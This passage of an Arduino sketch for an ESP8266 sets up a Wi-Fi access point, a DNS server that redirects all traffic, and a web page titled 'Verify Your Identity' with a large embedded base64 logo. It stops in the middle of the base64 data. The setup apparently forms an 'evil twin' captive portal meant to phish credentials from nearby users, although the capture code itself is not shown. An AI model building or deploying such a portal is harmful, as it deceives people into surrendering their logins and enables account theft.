#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h> 

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
int c_count;
String fdata="";
#define INBUILT_LED D4
String responseHTML = ""
                      "<!DOCTYPE html><html><head><meta charset='UTF-8'/><meta name='viewport' content='width=device-width, initial-scale=0.9' /><title>Verify Your Identity</title></head>"
                      "<body style='font-family: Calibri; text-align: center;padding:20px;'>"
                      "<div style='width: 95%; height: 100%;'>"
                      "<div style='border: 1px solid #dadada; width:fit-content;height: fit-content; padding: 5px; border-radius: 10px; margin-right: auto;margin-left: auto;margin-top: 200px;'>"
                      " <img src='data:image/png;base64,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 